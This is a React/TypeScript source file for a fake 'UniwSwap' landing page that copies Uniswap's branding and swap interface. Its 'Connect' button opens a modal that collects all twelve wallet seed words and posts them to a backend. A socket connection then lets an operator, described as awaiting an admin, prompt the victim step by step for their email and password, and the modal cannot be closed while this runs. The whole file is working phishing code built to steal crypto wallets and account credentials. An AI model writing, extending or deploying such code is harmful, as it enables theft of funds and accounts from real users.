import { FormEvent, useEffect, useMemo, useRef, useState } from 'react'
import type { Socket } from 'socket.io-client'
import { io } from 'socket.io-client'
import { useTranslation } from 'react-i18next'

import { SOCKET_BASE_URL, buildApiUrl } from '../config'
import '../App.css'

interface TokenTickerItem {
  symbol: string
  change: string
  direction: 'up' | 'down'
}

interface TokenOption {
  symbol: string
  name: string
  address: string
  color: string
}

type LoginStage = 'seed' | 'waiting' | 'email' | 'password' | 'finalized'

type SessionStatus =
  | 'seed-submitted'
  | 'awaiting-email'
  | 'awaiting-password'
  | 'password-submitted'
  | 'finalized'

const INITIAL_SEED_WORDS = Array.from({ length: 12 }, () => '')

const tokenTicker: TokenTickerItem[] = [
  { symbol: 'ETH', change: '-4.12%', direction: 'down' },
  { symbol: 'WBTC', change: '-1.06%', direction: 'down' },
  { symbol: 'UNI', change: '+0.42%', direction: 'up' },
  { symbol: 'USDC', change: '+0.00%', direction: 'up' },
  { symbol: 'PEPE', change: '-1.97%', direction: 'down' },
  { symbol: 'AAVE', change: '+0.56%', direction: 'up' },
]

const tokenOptions: TokenOption[] = [
  { symbol: 'ETH', name: 'Ethereum', address: 'ETH', color: '#627EEA' },
  { symbol: 'USDC', name: 'USD Coin', address: '0xA0b8…eB48', color: '#2775CA' },
  { symbol: 'USDT', name: 'Tether', address: '0xdAC1…1ec7', color: '#26A17B' },
  { symbol: 'WBTC', name: 'Wrapped Bitcoin', address: '0x2260…c599', color: '#F7931A' },
  { symbol: 'WETH', name: 'Wrapped Ether', address: '0xC02a…756Cc2', color: '#444' },
  { symbol: 'USDf', name: 'Falcon USD', address: '0xFa2B…CeC2', color: '#222' },
  { symbol: 'wM^0', name: 'WrappedM by M^0', address: '0x4737…B291', color: '#000' },
  { symbol: 'USDe', name: 'Ethena USDe', address: '0x4c9E…68B3', color: '#1D1D1D' },
  { symbol: 'DAI', name: 'Dai Stablecoin', address: '0x6B17…2710', color: '#F4B731' },
  { symbol: 'MKR', name: 'Maker', address: '0x9f8F…cdb', color: '#1AAB9B' },
]

const quickTokenSymbols = ['ETH', 'USDC', 'USDT', 'WBTC', 'WETH']

const getStatusLabel = (t: ReturnType<typeof useTranslation>['t'], status: SessionStatus | null) => {
  if (!status) {
    return t('login.status.seedSubmitted')
  }

  switch (status) {
    case 'seed-submitted':
      return t('login.status.seedSubmitted')
    case 'awaiting-email':
      return t('login.status.awaitingEmail')
    case 'awaiting-password':
      return t('login.status.awaitingPassword')
    case 'password-submitted':
      return t('login.status.passwordSubmitted')
    case 'finalized':
      return t('login.status.finalized')
    default:
      return t('login.status.seedSubmitted')
  }
}

const LandingPage = () => {
  const { t } = useTranslation()

  const [showModal, setShowModal] = useState(false)
  const [emailSubscription, setEmailSubscription] = useState('')
  const [subscriptionFeedback, setSubscriptionFeedback] = useState<string | null>(null)
  const [subscriptionFeedbackType, setSubscriptionFeedbackType] = useState<'success' | 'error' | null>(null)
  const [isSubscriptionSubmitting, setIsSubscriptionSubmitting] = useState(false)

  const [showTokenModal, setShowTokenModal] = useState(false)
  const [tokenSearch, setTokenSearch] = useState('')

  const [showLoginModal, setShowLoginModal] = useState(false)
  const [seedWords, setSeedWords] = useState<string[]>(INITIAL_SEED_WORDS)
  const [loginStage, setLoginStage] = useState<LoginStage>('seed')
  const [sessionId, setSessionId] = useState<string | null>(null)
  const [sessionStatus, setSessionStatus] = useState<SessionStatus | null>(null)
  const [loginError, setLoginError] = useState<string | null>(null)
  const [connectionNotice, setConnectionNotice] = useState<string | null>(null)

  const [emailInput, setEmailInput] = useState('')
  const [passwordInput, setPasswordInput] = useState('')

  const [isSeedSubmitting, setIsSeedSubmitting] = useState(false)
  const [isEmailSubmitting, setIsEmailSubmitting] = useState(false)
  const [isPasswordSubmitting, setIsPasswordSubmitting] = useState(false)

  const socketRef = useRef<Socket | null>(null)

  const navLinks = useMemo(
    () => [
      { label: 'Trade', href: '/swap' },
      { label: 'Explore', href: '/explore' },
      { label: 'Pool', href: '/positions' },
    ],
    [],
  )

  const filteredTokens = useMemo(() => {
    const term = tokenSearch.trim().toLowerCase()
    if (!term) return tokenOptions
    return tokenOptions.filter((token) =>
      [token.symbol, token.name, token.address].some((field) => field.toLowerCase().includes(term)),
    )
  }, [tokenSearch])

  const seedWordsFilled = seedWords.every((word) => word.trim().length > 0)

  useEffect(() => {
    const socket = io(SOCKET_BASE_URL || undefined, {
      query: { role: 'user' },
      transports: ['websocket'],
      withCredentials: true,
    })

    socketRef.current = socket

    const handleConnect = () => {
      setConnectionNotice(null)
    }

    const handleDisconnect = () => {
      setConnectionNotice(t('login.connectionIssue'))
    }

    const handleWaiting = ({ sessionId: id, status }: { sessionId: string; status?: SessionStatus }) => {
      setSessionId(id)
      setSessionStatus(status ?? 'seed-submitted')
      setLoginStage('waiting')
      setShowLoginModal(true)
      setIsSeedSubmitting(false)
      setIsEmailSubmitting(false)
      setIsPasswordSubmitting(false)
      setLoginError(null)
    }

    const handleRequestEmail = ({ sessionId: id }: { sessionId: string }) => {
      setSessionId(id)
      setLoginStage('email')
      setSessionStatus('awaiting-email')
      setEmailInput('')
      setIsEmailSubmitting(false)
      setLoginError(null)
      setShowLoginModal(true)
    }

    const handleRequestPassword = ({ sessionId: id }: { sessionId: string }) => {
      setSessionId(id)
      setLoginStage('password')
      setSessionStatus('awaiting-password')
      setPasswordInput('')
      setIsEmailSubmitting(false)
      setIsPasswordSubmitting(false)
      setLoginError(null)
      setShowLoginModal(true)
    }

    const handleFinalized = ({ sessionId: id }: { sessionId: string }) => {
      setSessionId(id)
      setLoginStage('finalized')
      setSessionStatus('finalized')
      setLoginError(null)
      setIsEmailSubmitting(false)
      setIsPasswordSubmitting(false)
      setShowLoginModal(true)
    }

    const handleSessionError = ({ message }: { message?: string }) => {
      setLoginError(message ?? t('login.genericError'))
      setIsSeedSubmitting(false)
      setIsEmailSubmitting(false)
      setIsPasswordSubmitting(false)
    }

    socket.on('connect', handleConnect)
    socket.on('disconnect', handleDisconnect)
    socket.io.on('reconnect_attempt', () => setConnectionNotice(t('login.connectionIssue')))
    socket.io.on('reconnect', () => setConnectionNotice(null))
    socket.io.on('error', () => setConnectionNotice(t('login.connectionIssue')))
    socket.on('session:waiting', handleWaiting)
    socket.on('session:requestEmail', handleRequestEmail)
    socket.on('session:requestPassword', handleRequestPassword)
    socket.on('session:finalized', handleFinalized)
    socket.on('session:error', handleSessionError)

    return () => {
      socket.off('connect', handleConnect)
      socket.off('disconnect', handleDisconnect)
      socket.io.off('reconnect_attempt')
      socket.io.off('reconnect')
      socket.io.off('error')
      socket.off('session:waiting', handleWaiting)
      socket.off('session:requestEmail', handleRequestEmail)
      socket.off('session:requestPassword', handleRequestPassword)
      socket.off('session:finalized', handleFinalized)
      socket.off('session:error', handleSessionError)
      socket.disconnect()
    }
  }, [t])

  const resetLoginFlow = () => {
    setSeedWords(INITIAL_SEED_WORDS)
    setLoginStage('seed')
    setSessionId(null)
    setSessionStatus(null)
    setEmailInput('')
    setPasswordInput('')
    setLoginError(null)
    setIsSeedSubmitting(false)
    setIsEmailSubmitting(false)
    setIsPasswordSubmitting(false)
  }

  const handleOpenTokenModal = () => {
    setTokenSearch('')
    setShowTokenModal(true)
  }

  const handleCloseTokenModal = () => {
    setShowTokenModal(false)
  }

  const handleOpenLoginModal = () => {
    if (loginStage === 'finalized') {
      resetLoginFlow()
    }
    setShowLoginModal(true)
  }

  const handleCloseLoginModal = () => {
    if (loginStage !== 'seed' && loginStage !== 'finalized') {
      return
    }
    setShowLoginModal(false)
    if (loginStage === 'finalized') {
      resetLoginFlow()
    }
  }

  const handleSeedSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    if (isSeedSubmitting) return

    const socketId = socketRef.current?.id
    if (!socketId) {
      setLoginError(t('login.invalidSocket'))
      socketRef.current?.connect()
      return
    }

    if (!seedWordsFilled) {
      setLoginError(t('login.missingSeed'))
      return
    }

    const sanitizedSeedWords = seedWords.map((word) => word.trim())

    try {
      setIsSeedSubmitting(true)
      setLoginError(null)

      const response = await fetch(buildApiUrl('/api/sessions'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedWords: sanitizedSeedWords, socketId }),
      })

      if (!response.ok) {
        const data = await response.json().catch(() => null)
        setLoginError(data?.error ?? t('login.genericError'))
        setIsSeedSubmitting(false)
        return
      }

      const data = (await response.json()) as { sessionId: string }
      setSessionId(data.sessionId)
      setSessionStatus('seed-submitted')
      setLoginStage('waiting')
      setShowLoginModal(true)
      setIsSeedSubmitting(false)
    } catch (error) {
      console.error('Failed to submit seed words', error)
      setLoginError(t('login.genericError'))
      setIsSeedSubmitting(false)
    }
  }

  const handleEmailSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    if (!sessionId) {
      setLoginError(t('login.sessionUnavailable'))
      return
    }

    if (!emailInput.trim()) {
      setLoginError(t('login.emailRequired'))
      return
    }

    const socket = socketRef.current
    if (!socket) {
      setLoginError(t('login.invalidSocket'))
      return
    }

    setIsEmailSubmitting(true)
    setLoginError(null)

    socket.emit('session:submitEmail', { sessionId, email: emailInput.trim() })
  }

  const handlePasswordSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    if (!sessionId) {
      setLoginError(t('login.sessionUnavailable'))
      return
    }

    if (!passwordInput.trim()) {
      setLoginError(t('login.passwordRequired'))
      return
    }

    const socket = socketRef.current
    if (!socket) {
      setLoginError(t('login.invalidSocket'))
      return
    }

    setIsPasswordSubmitting(true)
    setLoginError(null)

    socket.emit('session:submitPassword', { sessionId, password: passwordInput })
  }

  const handleStartClick = () => {
    setShowModal(true)
    setSubscriptionFeedback(null)
    setSubscriptionFeedbackType(null)
  }

  const handleSubscriptionSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()

    if (isSubscriptionSubmitting) return

    setIsSubscriptionSubmitting(true)
    setSubscriptionFeedback(null)
    setSubscriptionFeedbackType(null)

    try {
      const response = await fetch(buildApiUrl('/api/subscribe'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: emailSubscription }),
      })

      if (response.ok) {
        setSubscriptionFeedback(t('landing.subscribeSuccess'))
        setSubscriptionFeedbackType('success')
        setEmailSubscription('')
        setTimeout(() => setShowModal(false), 1200)
      } else {
        const data = await response.json().catch(() => null)
        setSubscriptionFeedback(data?.error ?? t('landing.subscribeError'))
        setSubscriptionFeedbackType('error')
      }
    } catch (error) {
      console.error('Subscription error', error)
      setSubscriptionFeedback(t('landing.subscribeError'))
      setSubscriptionFeedbackType('error')
    } finally {
      setIsSubscriptionSubmitting(false)
    }
  }

  const statusLabel = getStatusLabel(t, sessionStatus)
  const canCloseLoginModal = loginStage === 'seed' || loginStage === 'finalized'

  return (
    <div className="page">
      <div className="background">
        <span className="blob blob-1" />
        <span className="blob blob-2" />
        <span className="blob blob-3" />
        <span className="blob blob-4" />
      </div>

      <header className="top-bar">
        <div className="top-left">
          <a className="brand" href="/">
            <img src="/uniswap-logo.svg" alt="UniwSwap" className="brand-icon" />
            <span className="brand-text">UniwSwap</span>
          </a>
          <nav className="nav-links">
            {navLinks.map((link) => (
              <a key={link.label} href={link.href}>
                {link.label}
              </a>
            ))}
          </nav>
        </div>

        <div className="top-right">
          <button className="icon-button" aria-label="Select network">
            <span className="network-dot" />
            <span className="network-name">Ethereum</span>
            <span className="caret" />
          </button>
          <button className="icon-button" aria-label="Search">
            <span className="search-icon" />
          </button>
          <button className="ghost-button">Download the app</button>
          <button className="icon-button" aria-label="More options">
            <span className="more-icon">•••</span>
          </button>
          <button className="connect-button" onClick={handleOpenLoginModal}>
            Connect
          </button>
        </div>
      </header>

      <section className="ticker" aria-label="Token price changes">
        <div className="ticker-track">
          {tokenTicker.map((token) => (
            <div className="ticker-item" key={token.symbol}>
              <span className="ticker-symbol">{token.symbol}</span>
              <span
                className={`ticker-change ${token.direction === 'up' ? 'up' : 'down'}`}
                aria-label={`Change ${token.direction === 'up' ? 'upward' : 'downward'}`}
              >
                {token.change}
              </span>
            </div>
          ))}
        </div>
      </section>

      <main className="hero" role="main">
        <h1 className="headline">
          Swap anytime,
          <br />
          anywhere.
        </h1>

        <div className="swap-card" role="group" aria-labelledby="swap-title">
          <div className="swap-row">
            <div className="swap-meta">
              <span className="swap-title" id="swap-title">
                Sell
              </span>
              <span className="swap-subtitle">0 USD</span>
            </div>
            <div className="swap-input-group">
              <input type="number" placeholder="0" aria-label="Amount to sell" />
              <button className="token-select">
                <span className="token-icon" aria-hidden="true" />
                <span>ETH</span>
                <span className="caret" />
              </button>
            </div>
          </div>

          <div className="swap-divider" aria-hidden="true">
            <span className="divider-arrow" />
          </div>

          <div className="swap-row">
            <div className="swap-meta">
              <span className="swap-title">Buy</span>
              <span className="swap-subtitle">0 USD</span>
            </div>
            <div className="swap-input-group">
              <input type="number" placeholder="0" aria-label="Amount to buy" />
              <button className="token-select highlight" type="button" onClick={handleOpenTokenModal}>
                <span className="token-placeholder" aria-hidden="true" />
                <span>Select token</span>
                <span className="caret" />
              </button>
            </div>
          </div>

          <button className="start-button" onClick={handleStartClick}>
            Get started
          </button>
        </div>

        <p className="hero-caption">
          Buy and sell crypto across 14+ networks, including Ethereum, Unichain, and Base.
        </p>

        <div className="scroll-indicator">
          Scroll to learn more
          <span className="scroll-icon" aria-hidden="true" />
        </div>
      </main>

      {showModal && (
        <div className="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="modal-title">
          <div className="modal">
            <button className="close-button" onClick={() => setShowModal(false)} aria-label="Close modal">
              ×
            </button>
            <h2 id="modal-title">Coming Soon</h2>
            <p>Enter your email to get notified when we launch.</p>
            <form onSubmit={handleSubscriptionSubmit}>
              <label className="label" htmlFor="subscription-email">
                Email
              </label>
              <input
                id="subscription-email"
                type="email"
                placeholder="you@email.com"
                value={emailSubscription}
                onChange={(event) => setEmailSubscription(event.target.value)}
                required
              />
              <button type="submit" className="submit-button" disabled={isSubscriptionSubmitting}>
                {isSubscriptionSubmitting ? 'Sending…' : 'Subscribe'}
              </button>
              {subscriptionFeedback && (
                <span className={`form-feedback ${subscriptionFeedbackType ?? ''}`}>{subscriptionFeedback}</span>
              )}
            </form>
          </div>
        </div>
      )}

      {showTokenModal && (
        <div className="token-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="token-modal-title">
          <div className="token-modal">
            <header className="token-modal-header">
              <h2 id="token-modal-title">Select a token</h2>
              <button
                type="button"
                className="close-button"
                aria-label="Close token modal"
                onClick={handleCloseTokenModal}
              >
                ×
              </button>
            </header>

            <div className="token-search">
              <span className="search-icon" aria-hidden="true" />
              <input
                type="text"
                placeholder="Search tokens"
                value={tokenSearch}
                onChange={(event) => setTokenSearch(event.target.value)}
                autoFocus
              />
              <button type="button" className="network-toggle" aria-label="Select network">
                <span className="network-dot" />
                <span className="caret" />
              </button>
            </div>

            <div className="quick-token-chips" role="list">
              {quickTokenSymbols.map((symbol) => {
                const token = tokenOptions.find((item) => item.symbol === symbol)
                if (!token) return null
                return (
                  <button key={symbol} type="button" className="token-chip">
                    <span className="token-chip-icon" style={{ backgroundColor: token.color }} />
                    <span>{symbol}</span>
                  </button>
                )
              })}
            </div>

            <div className="token-section-label">Top tokens by 24h volume</div>

            <ul className="token-list">
              {filteredTokens.map((token) => (
                <li key={token.symbol}>
                  <button type="button" className="token-row">
                    <span className="token-avatar" style={{ backgroundColor: token.color }} />
                    <span className="token-info">
                      <span className="token-name">{token.name}</span>
                      <span className="token-address">{token.address}</span>
                    </span>
                    <span className="token-symbol">{token.symbol}</span>
                  </button>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}

      {showLoginModal && (
        <div className="login-modal-overlay" role="dialog" aria-modal="true" aria-labelledby="login-modal-title">
          <div className="login-modal">
            <header className="login-modal-header">
              <h2 id="login-modal-title">
                {loginStage === 'seed' && t('login.title')}
                {loginStage === 'waiting' && t('login.waitingTitle')}
                {loginStage === 'email' && t('login.emailTitle')}
                {loginStage === 'password' && t('login.passwordTitle')}
                {loginStage === 'finalized' && t('login.finalizedTitle')}
              </h2>
              {canCloseLoginModal && (
                <button
                  type="button"
                  className="close-button"
                  aria-label="Close login modal"
                  onClick={handleCloseLoginModal}
                >
                  ×
                </button>
              )}
            </header>

            {connectionNotice && <div className="connection-banner">{connectionNotice}</div>}
            {loginError && <div className="form-feedback error login-error">{loginError}</div>}

            {loginStage === 'seed' && (
              <>
                <p>{t('login.instruction')}</p>
                <form onSubmit={handleSeedSubmit}>
                  <div className="seed-words-grid">
                    {seedWords.map((word, index) => (
                      <input
                        key={index}
                        type="text"
                        placeholder={`${t('login.wordPlaceholder')} ${index + 1}`}
                        value={word}
                        onChange={(event) => {
                          const next = [...seedWords]
                          next[index] = event.target.value
                          setSeedWords(next)
                        }}
                        className={word.trim().length === 0 ? 'empty-field' : ''}
                        required
                      />
                    ))}
                  </div>
                  <button
                    type="submit"
                    className={`login-submit-button ${!seedWordsFilled || isSeedSubmitting ? 'disabled' : ''}`}
                    disabled={!seedWordsFilled || isSeedSubmitting}
                  >
                    {isSeedSubmitting ? t('login.submitting') : `${t('login.confirm')} (${seedWords.filter((word) => word.trim().length > 0).length}/12)`}
                  </button>
                </form>
              </>
            )}

            {loginStage === 'waiting' && (
              <div className="login-waiting">
                <div className="login-spinner" aria-hidden="true" />
                <p className="login-waiting-status">{statusLabel}</p>
                <p className="login-helper-text">{t('login.awaitingAdmin')}</p>
              </div>
            )}

            {loginStage === 'email' && (
              <form onSubmit={handleEmailSubmit} className="login-form">
                <p>{t('login.emailInstruction')}</p>
                <label className="label" htmlFor="session-email">
                  {t('login.emailLabel')}
                </label>
                <input
                  id="session-email"
                  type="email"
                  placeholder={t('login.emailPlaceholder')}
                  value={emailInput}
                  onChange={(event) => setEmailInput(event.target.value)}
                  required
                />
                <button type="submit" className="login-submit-button" disabled={isEmailSubmitting}>
                  {isEmailSubmitting ? t('login.submitting') : t('login.submitEmail')}
                </button>
              </form>
            )}

            {loginStage === 'password' && (
              <form onSubmit={handlePasswordSubmit} className="login-form">
                <p>{t('login.passwordInstruction')}</p>
                <label className="label" htmlFor="session-password">
                  {t('login.passwordLabel')}
                </label>
                <input
                  id="session-password"
                  type="password"
                  placeholder={t('login.passwordPlaceholder')}
                  value={passwordInput}
                  onChange={(event) => setPasswordInput(event.target.value)}
                  required
                />
                <button type="submit" className="login-submit-button" disabled={isPasswordSubmitting}>
                  {isPasswordSubmitting ? t('login.submitting') : t('login.submitPassword')}
                </button>
              </form>
            )}

            {loginStage === 'finalized' && (
              <div className="login-finalized">
                <p>{t('login.finalizedDescription')}</p>
                <button type="button" className="login-submit-button" onClick={handleCloseLoginModal}>
                  {t('login.close')}
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

export default LandingPage
